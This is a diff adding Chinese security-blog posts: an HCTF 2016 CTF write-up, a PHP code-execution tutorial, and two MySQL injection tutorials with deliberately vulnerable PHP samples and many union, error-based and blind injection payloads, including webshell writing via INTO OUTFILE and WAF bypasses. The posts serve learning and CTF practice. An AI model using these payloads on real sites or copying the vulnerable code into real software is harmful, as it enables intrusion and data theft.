@@ -196,6 +196,631 @@
 
 
   
+    <article id="post-hctf2016-writeup" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/27/hctf2016-writeup/">hctf2016 writeup</a>
+    </h1>
+  
+
+        <a href="/2016/11/27/hctf2016-writeup/" class="archive-article-date">
+  	<time datetime="2016-11-27T13:45:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-11-27</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level-1"></a>Level-1</h2><h3 id="1-misc-杂项签到"><a href="#1-misc-杂项签到" class="headerlink" title="1. misc 杂项签到"></a>1. misc 杂项签到</h3><pre>
+    根据题目链接下载了一个流量包文件，打开简单分析了一下内容。管理员登录bash后查
+看function.py的内容，代码如下：
+</pre>
+<pre lang="python" line="1" escaped="true">
+#!/usr/bin/env python
+# coding:utf-8
+__author__ = 'Aklis'
+from Crypto import Random
+from Crypto.Cipher import AES
+import sys
+import base64
+def decrypt(encrypted, passphrase):
+  IV = encrypted[:16]
+  aes = AES.new(passphrase, AES.MODE_CBC, IV)
+  return aes.decrypt(encrypted[16:])
+def encrypt(message, passphrase):
+  IV = message[:16]
+  length = 16
+  count = len(message)
+  padding = length - (count % length)
+  message = message + '\0' * padding
+  aes = AES.new(passphrase, AES.MODE_CBC, IV)
+  return aes.encrypt(message)
+IV = 'YUFHJKVWEASDGQDH'
+message = IV + 'flag is hctf{xxxxxxxxxxxxxxx}'
+print len(message)
+example = encrypt(message, 'Qq4wdrhhyEWe4qBF')
+print example
+example = decrypt(example, 'Qq4wdrhhyEWe4qBF') 
+print example
+</pre>
+<pre>
+    此外,流量中还获取到了密文flag的base64形式: mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rw
+pgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA== 根据代码中的解密算
+法可得到flag
+</pre>
+<pre lang="python" line="1" escaped="true">
+#!/usr/bin/env python
+# coding:utf-8
+__author__ = 'Aklis'
+from Crypto import Random
+from Crypto.Cipher import AES
+import sys
+import base64
+def decrypt(encrypted, passphrase):
+  IV = encrypted[:16]
+  aes = AES.new(passphrase, AES.MODE_CBC, IV)
+  return aes.decrypt(encrypted[16:])
+def encrypt(message, passphrase):
+  IV = message[:16]
+  length = 16
+  count = len(message)
+  padding = length - (count % length)
+  message = message + '\0' * padding
+  aes = AES.new(passphrase, AES.MODE_CBC, IV)
+  return aes.encrypt(message)
+IV = 'YUFHJKVWEASDGQDH'
+#message = IV + 'flag is hctf{xxxxxxxxxxxxxx}'
+message = base64.b64decode('mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==')
+print len(message)
+#example = encrypt(message, 'Qq4wdrhhyEWe4qBF')
+#print example
+example = decrypt(message, 'Qq4wdrhhyEWe4qBF') 
+print example
+</pre>
+![35](http://www.0wen.cc/wp-content/uploads/2016/11/35.png)
+
+### web 2099年的flag
+
+<pre>
+    描述：only ios99 can get flag(Maybe you can easily get the flag in 2099
+看到描述后，果断构造UA得到flag： hctf{h77p_He4dEr_50_E4sy}
+</pre>
+![36](http://www.0wen.cc/wp-content/uploads/2016/11/36.png)
+
+## level-2 web RESTFUL
+
+<pre>
+    打开后看到 "Please <put> me some <money> more than <12450>!"再结合源代码
+看到的js,这道题考察队restful架构uri的认识,构造以下请求代码即可得到flag
+</12450></money></put></pre>
+<pre lang="javascript" line="1" escaped="true">
+$.ajax({
+        type: 'PUT',
+        url: "index.php/money/1000000",
+    }).done(function(r) {
+        $('#message').text(r['message']);
+    }).fail(function(){
+            console.log("Error: " + err.status);
+    });
+</pre>
+![37](http://www.0wen.cc/wp-content/uploads/2016/11/37.png)
+
+### misc pic again
+
+<pre>
+    LSB隐写
+</pre>
+![%e5%8e%9f%e5%9b%be](http://www.0wen.cc/wp-content/uploads/2016/11/原图.png)
+使用神器Stegsolve进行分析，发现图片最低有效位隐藏了一个rar文件，对这个文件进行修复后解
+压缩，得到一个linux可执行文件，直接strings 得到flag
+![38](http://www.0wen.cc/wp-content/uploads/2016/11/38.png)
+
+### msic gogogo
+
+<pre>
+    魂斗罗，加上金手指，通关得到flag
+</pre>
+
+<h3 id="web-兵者多诡"><a href="#web-兵者多诡" class="headerlink" title="web 兵者多诡"></a>web 兵者多诡</h3><pre>
+    这道题目是比较接近实战的一个题目，文件包含+文件上传getshell，首先通关包含漏
+洞拿到这道题的源码。然后去分析源码，发现不论上传什么，上传成功后都会被重命名
+随机数.png。
+    我开始的思路是上传一个执行命令的小马，然后用%00,或者？等去截断，但是一直都失
+败。然后我换了一个思路，上传zip包，zip包里有一个php小马，然后在用zip://协议去读
+，成功读取。但是我直到现在还是感觉第一种思路没问题，就是找不到原因。。。。。。。
+</pre>
+![39](http://www.0wen.cc/wp-content/uploads/2016/11/39.png)
+<pre>
+    gustbook直到结束还没看出来要考的是啥，xss？以为是xss,但是构造出payload，并且
+成功弹出cookie后，而且同时在xss平台等了一天的管理员cookie，也没信息。现在就是坐
+等官方writeup了
+-----------------------------------------------------------------
+    官方writeup出来了，果真是xss，绕过csp来打管理员cookie，这就非常尴尬了！！！！
+</pre>
+
+<h3 id="web-比香港记者还要快"><a href="#web-比香港记者还要快" class="headerlink" title="web  比香港记者还要快"></a>web  比香港记者还要快</h3><pre>
+    打开这道题，有一个注册页面，有一个登录页面，最初的想法会不会存在sql注入，fuzz了
+半天没什么进展。最后无意间发现.git和README.MD，里面描述开发人员的changelog。这下大
+概知道了代码的流程：
+    先注册为管理员，然后再降权成普通用户。这时候一个猥琐的想法就产生了，我一边注册，
+一边在降权之前登录，这就是管理员权限了。
+</pre>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+	<i class="icon-book icon"></i>
+	<a class="article-category-link" href="/categories/ctf/">ctf</a>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2016/11/27/hctf2016-writeup/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-php-e6-bc-8f-e6-b4-9e-e4-b9-8b-e4-bb-a3-e7-a0-81-e6-89-a7-e8-a1-8c" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/27/php-e6-bc-8f-e6-b4-9e-e4-b9-8b-e4-bb-a3-e7-a0-81-e6-89-a7-e8-a1-8c/">php漏洞之代码执行</a>
+    </h1>
+  
+
+        <a href="/2016/11/27/php-e6-bc-8f-e6-b4-9e-e4-b9-8b-e4-bb-a3-e7-a0-81-e6-89-a7-e8-a1-8c/" class="archive-article-date">
+  	<time datetime="2016-11-27T12:33:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-11-27</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<pre>    代码执行漏洞是指应用程序过滤不严格，用户可以通过请求将代码注入到应用中去
+
+执行。类比于sql注入，sql注入是将代码注入进sql服务器去执行，而代码执行是将代
+
+码注入到web去执行服务器。在本篇文章中将会总结php代码执行的情况，以及在开发中
+
+如何去避免此类漏洞的发生。
+
+</pre>
+
+</blockquote>
+<h2 id="1-静态函数执行"><a href="#1-静态函数执行" class="headerlink" title="1.静态函数执行"></a>1.静态函数执行</h2><p></p><h3>1.1 eval函数和assert函数<p></p>
+<pre>
+    这两个函数都是将它们的参数直接当做php代码来执行,测试代码如下：
+</pre>
+<pre lang="php" line="1" escaped="true">
+<?php
+    assert('phpinfo()');
+?>
+</pre>
+
+<h3 id="1-2preg-replace-函数"><a href="#1-2preg-replace-函数" class="headerlink" title="1.2preg_replace()函数"></a>1.2preg_replace()函数</h3><pre>
+    preg_replace()函数作用是对字符串进行正则处理，测试代码如下：
+</pre>
+<pre lang="php" line="1" escaped="true">
+<?php
+    preg_replace('/\[(.*)\]/e', '\\1', $_GET['str']);
+?>
+</pre>
+![31](http://www.0wen.cc/wp-content/uploads/2016/11/31.png)
+
+## 2.动态函数执行
+<pre lang="php" line="1" escaped="true">
+<?php
+    $_GET['a']($_GET['b']);
+?>
+</pre>
+![32](http://www.0wen.cc/wp-content/uploads/2016/11/32.png)
+<h2>3.回调函数执行
+
+<pre>
+    call_user_func()和array_map()等多个函数都有调用其他函数的功能，其中一个参数为要调
+用的函数名，如果这个传入的函数名可控，那么就可以进行代码注入
+    以call_user_func()为例，写一个小demo：
+</pre>
+<pre lang="php" line="1" escaped="true">
+<?php
+    $b = "phpinfo()";
+    call_user_func($_GET['a'],$b);
+?>
+</pre>
+![33](http://www.0wen.cc/wp-content/uploads/2016/11/33.png)
+
+## 4.文件包含
+
+<pre>
+    利用文件包含漏洞进行代码执行。如本地包含、远程包含（allow_url_include=on）、及
+各种协议(filter、input等)，以及包含截断的姿势：%00截断、 windows 240个./截断 、
+linux下2038个./组合截断、？伪截断
+    php://filter/convert.base64-encode/resource
+    php://input
+    data:text/plain,
+    等等
+</pre>
+
+<h2 id="5-通过addslashes-过滤后的绕过"><a href="#5-通过addslashes-过滤后的绕过" class="headerlink" title="5.通过addslashes()过滤后的绕过"></a>5.通过addslashes()过滤后的绕过</h2><pre lang="php" line="1" escaped="true">
+<?php
+    $str = "echo \"hello".$_GET['name']."!!!\";";
+    eval($str);
+?>
+</pre></h2></h3>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+	<i class="icon-book icon"></i>
+	<a class="article-category-link" href="/categories/php漏洞/">php漏洞</a><a class="article-category-link" href="/categories/php漏洞/代码执行/">代码执行</a>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2016/11/27/php-e6-bc-8f-e6-b4-9e-e4-b9-8b-e4-bb-a3-e7-a0-81-e6-89-a7-e8-a1-8c/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-ba-8c-ef-bc-89" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/10/mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-ba-8c-ef-bc-89/">php漏洞之mysql注入（二）</a>
+    </h1>
+  
+
+        <a href="/2016/11/10/mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-ba-8c-ef-bc-89/" class="archive-article-date">
+  	<time datetime="2016-11-10T06:33:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-11-10</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00："><a href="#0x00：" class="headerlink" title="0x00："></a>0x00：</h2><blockquote>
+<pre>    在上篇文章中总结了mysql注入中常见得union注入，三种常见的报错注入，inser、upd
+
+ate、delete报错注入、limit后注入、order by注入， 在这篇文章中我会以基于表达式的盲
+
+注和基于时间的盲注、基于报错的盲注方式来利用上篇文章中漏洞。
+
+</pre>
+
+</blockquote>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h2><pre>    
+    为什么要使用基于时间的盲注呢，相信大家在渗透过程中遇到这样的情况：遇到一个sql注
+入，但是网站的mysql版本低于5.0，不能利用这时候怎么办呢？这时候盲注就是非常好的一个办
+法。
+</pre>
+
+<h3 id="1-基于表达式的盲注（ascii法）"><a href="#1-基于表达式的盲注（ascii法）" class="headerlink" title="1.基于表达式的盲注（ascii法）"></a>1.基于表达式的盲注（ascii法）</h3><pre>
+    首先了解几个关于mysql的函数:
+    (1).substring(expression, start, length)   返回字符、二进制、文本或图像表达
+式的一部分
+    (2).assic(str)   最左边的字符串str返回的数值
+</pre>
+![26](http://www.0wen.cc/wp-content/uploads/2016/11/26.png)
+<pre>
+    针对上篇文章的union注入，使用表达式注入，效果如下：
+</pre>
+![27](http://www.0wen.cc/wp-content/uploads/2016/11/27.png)
+
+### 2.基于表达式的盲注(正则表达式法)
+
+poc:
+and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND table_name REGEXP '^s' LIMIT 0,1)-- - 
+![27](http://www.0wen.cc/wp-content/uploads/2016/11/27-1.png)
+
+![28](http://www.0wen.cc/wp-content/uploads/2016/11/28.png)
+
+### 3.基于时间的盲注
+
+<pre>
+    首先来了解几个关于mysql的函数
+    (1).find_in_set(str,strlist)   查询字段(strlist)中包含(str)的结果
+    strlist 字段名 参数以”,”分隔 如 (1,2,6,8)
+    (2).mid(column_name,start[,length])   
+</pre>
+![29](http://www.0wen.cc/wp-content/uploads/2016/11/29.png)
+<pre>
+    (3).if(expr1,expr2,expr3) 如果expr1表达式为真，则返回expr2，否则返回expr3
+</pre>
+![30](http://www.0wen.cc/wp-content/uploads/2016/11/30.png)
+
+### 4.基于报错的时间盲注
+
+<pre>
+    (1).经典语句：
+    select 1,2 union select count(*),concat(version(),floor(rand(0)*2))x 
+from information_schema.tables group by x;
+    (2).简化后：
+    select count(*) from information_schema.tables group by concat(
+version(),floor(rand(0)*2))
+    (3).关键表被禁后：
+    select count(*) from information_schema.tables group by concat(
+version(),floor(rand(0)*2))
+    (4).rand()被禁后
+    select min(@a:=1) from information_schema.tables group by concat
+(password,@a:=(@a+1)%2)
+</pre>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+	<i class="icon-book icon"></i>
+	<a class="article-category-link" href="/categories/mysql/">mysql</a><a class="article-category-link" href="/categories/mysql/php漏洞/">php漏洞</a><a class="article-category-link" href="/categories/mysql/php漏洞/注入/">注入</a>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2016/11/10/mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-ba-8c-ef-bc-89/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-b8-80-ef-bc-89" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/06/mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-b8-80-ef-bc-89/">php漏洞之mysql注入（一）</a>
+    </h1>
+  
+
+        <a href="/2016/11/06/mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-b8-80-ef-bc-89/" class="archive-article-date">
+  	<time datetime="2016-11-06T13:57:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-11-06</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="mysql-union注入"><a href="#mysql-union注入" class="headerlink" title="mysql union注入"></a><strong>mysql union注入</strong></h1><h2 id="1-基于数字型"><a href="#1-基于数字型" class="headerlink" title="1.基于数字型"></a>1.基于数字型</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="http://www.0wen.cc/wp-content/uploads/2016/10/11.png" alt="11"></h2><pre>  本次演示所有注入漏洞都是基于上图
+  测试代码如下：
+<pre lang="php" line="1" escaped="true">
+<?php
+$user = $_GET['user'];
+$uuser = addslashes($user);
+$_mysqli = new mysqli('127.0.0.1','root','root','test');
+    if (mysqli_connect_errno()) {
+        echo '数据库连接错误！错误代码：'.mysqli_connect_error();
+        exit();
+    }
+    $_mysqli->set_charset('gbk');
+    $sql = "select * from sql_test where user = '$uuser'";
+    echo $sql."
+";
+    $results = $_mysqli->query($sql)  or die($_mysqli->error);
+    if ($results){
+        $rows = $results->fetch_array();
+        echo "user:".$rows[1];
+    }
+?>
+</pre>
+  利用方法如下：
+  poc：-1 union select 1,user(),3</pre>
+![12](http://www.0wen.cc/wp-content/uploads/2016/10/12.png)
+
+其中，user()：当前用户 还可以替换为database():数据库、version():数据库版本、@@version_compile_os:服务器操作系统、@@datadir: 数据路径
+
+在渗透过程中，如果要是能够判断mysql具有读写权限，则我们就可以直接写马到web目录，进而获得webshell
+1)判断是否有读写权限：
+and (select count(*) from mysql.user)&gt;0
+and (select count(file_priv) from mysql.user)&gt;0
+对于file_priv 我们可以看配置文件说明:![16](http://www.0wen.cc/wp-content/uploads/2016/10/16.png)
+
+2)有了读写权限，我们还需要知道web目录的路径，这时候就需要我们自己的经验来获得了，如sql报错显示路径等。
+使用load_file()进行读取、使用 into outfile 和 dumpfile，其中的路径和内容我们可以load_file(char(32,26,56,66))和load_file(0x633A5C626F6F742E696E69)来绕过某些waf
+
+3)如果没有读写权限，我们还可以使用information_schema进行查询库中表、列、字段信息.
+a.查询表的信息：http://localhost/sql_injection/union.php?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 0x74657374
+
+![13](http://www.0wen.cc/wp-content/uploads/2016/10/13.png)
+
+b.查询列的信息：http://localhost/sql_injection/union.php?id=-1 UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name =0x73716C5F74657374
+
+![14](http://www.0wen.cc/wp-content/uploads/2016/10/14.png)
+
+c.查询字段信息：http://localhost/sql_injection/union.php?id=-1 UNION SELECT 1,group_concat(id,0x3a,user,0x3a,pass),3 from sql_test![15](http://www.0wen.cc/wp-content/uploads/2016/10/15.png)
+
+## 2.基于字符型的注入
+
+<pre>  基于字符型的注入原理与数字型类似，主要区别在于单引号的闭合
+
+</pre>
+
+<h2 id="3-宽字节注入"><a href="#3-宽字节注入" class="headerlink" title="3.宽字节注入"></a>3.宽字节注入</h2><p>当使用gbk编码时，使用%df%27等闭合单引号后，参考数字型注入</p>
+<h1 id="mysql报错注入"><a href="#mysql报错注入" class="headerlink" title="mysql报错注入"></a><strong>mysql报错注入</strong></h1><h2 id="1-mysql常见三种报错："><a href="#1-mysql常见三种报错：" class="headerlink" title="1.mysql常见三种报错："></a>1.mysql常见三种报错：</h2><p>1.floor()报错： id=1 and (select 1 from (select count(<em>),concat(user(),floor(rand(0)</em>2))x from information_schema.tables group by x)a)</p>
+<p><img src="http://www.0wen.cc/wp-content/uploads/2016/10/18.png" alt="18"></p>
+<p>2.extractvalue(): id=1 and (extractvalue(1,concat(0x5c,(select user()))))</p>
+<p><img src="http://www.0wen.cc/wp-content/uploads/2016/10/19.png" alt="19"></p>
+<p>3.updatexml(): id=1 and (updatexml(1,concat(0x5e24,(select user()),0x5e24),1))</p>
+<p><img src="http://www.0wen.cc/wp-content/uploads/2016/10/20.png" alt="20"></p>
+<h2 id="2-insert注入"><a href="#2-insert注入" class="headerlink" title="2. insert注入"></a>2. insert注入</h2><p>示例代码：</p>
+<pre lang="php" line="1" escaped="true">
+<?php
+$user = $_GET['user'];
+$pass = $_GET['pass'];
+$_mysqli = new mysqli('127.0.0.1','root','root','test');
+    if (mysqli_connect_errno()) {
+        echo '数据库连接错误！错误代码：'.mysqli_connect_error();
+        exit();
+    }
+    $_mysqli->set_charset('utf8');
+    $sql = "INSERT INTO `sql_test`( `user`, `pass`) values ('$user','$pass')";
+
+    $results = $_mysqli->query($sql)  or die($_mysqli->error);
+    if($results){
+        echo $sql."
+";
+    }
+?>
+</pre>
+![21](http://www.0wen.cc/wp-content/uploads/2016/10/21.png)
+
+poc：' and (extractvalue(1,concat(0x7e,(select user()),0x7e))))-- -
+
+## 3.update注入
+
+示例代码：
+<pre lang="php" line="1" escaped="true">
+<?php
+//update注入实例
+//poc: ' or (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- - 
+// 如果没有 or die($_mysqli->error)呢？  该怎么利用
+$user = $_GET['user'];
+$pass = $_GET['pass'];
+$_mysqli = new mysqli('127.0.0.1','root','root','test');
+    if (mysqli_connect_errno()) {
+        echo '数据库连接错误！错误代码：'.mysqli_connect_error();
+        exit();
+    }
+    //update user set user=$user,pass=$pass
+    $_mysqli->set_charset('utf8');
+    $sql = "update sql_test set user='$user',pass='$pass'";
+    echo $sql."
+";
+    $results = $_mysqli->query($sql)  or die($_mysqli->error);
+
+?>
+</pre>
+![22](http://www.0wen.cc/wp-content/uploads/2016/10/22.png)
+
+poc：' or (extractvalue(1,concat(0x7e,(select user()),0x7e)))---
+
+## 4.delete注入
+
+示例代码
+<pre lang="php" line="1" escaped="true">
+<?php
+//delete注入实例
+//poc: ' or (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- - 
+// 如果没有 or die($_mysqli->error)呢？  该怎么利用
+$user = $_GET['user'];
+//$pass = $_GET['pass'];
+$_mysqli = new mysqli('127.0.0.1','root','root','test');
+    if (mysqli_connect_errno()) {
+        echo '数据库连接错误！错误代码：'.mysqli_connect_error();
+        exit();
+    }
+    //delete from user where user=$user
+    $_mysqli->set_charset('utf8');
+    $sql = "delete from sql_test where user='$user'";
+    echo $sql."
+";
+    $results = $_mysqli->query($sql)  or die($_mysqli->error);
+
+?>
+</pre>
+
+<p>poc: ‘ or (extractvalue(1,concat(0x7e,(select user()),0x7e)))– -</p>
+<p><img src="http://www.0wen.cc/wp-content/uploads/2016/10/23.png" alt="23"></p>
+<p>5.order by 注入<br>poc:<br>select <em> from sql_test order by (SELECT 1 from (select count(</em>),concat(floor(rand(0)*2),(substring((select(user())),1,62)))a from information_schema.tables group by a)b);</p>
+<p><img src="http://www.0wen.cc/wp-content/uploads/2016/11/24.png" alt="24"></p>
+<p>6.limit 注入<br>这里以一道ctf题进行演示，地址为：<a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1" target="_blank" rel="external">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1</a><br>poc:<br>procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)%23<br><img src="http://www.0wen.cc/wp-content/uploads/2016/11/25.png" alt="25"></p>
+<p>未完待续……</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+	<i class="icon-book icon"></i>
+	<a class="article-category-link" href="/categories/mysql/">mysql</a><a class="article-category-link" href="/categories/mysql/注入/">注入</a>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2016/11/06/mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-b8-80-ef-bc-89/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
   
 
 
